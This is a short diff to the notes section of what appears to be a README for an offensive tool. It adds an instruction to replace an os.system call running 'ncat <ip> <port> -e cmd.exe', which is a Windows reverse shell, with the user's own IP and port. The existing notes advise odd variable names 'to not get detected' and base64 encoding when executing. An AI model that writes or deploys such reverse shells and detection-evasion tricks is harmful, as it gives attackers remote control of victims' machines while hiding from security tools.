@@ -14,6 +14,7 @@ Functions:
 
 Notes:
 
+* Replace os.system('cmd /k "ncat <ip> <port> -e cmd.exe"') with your corresponding IP & Port
 * Variables need weird names to not get detected
 * Use base64 or similar when exec
 
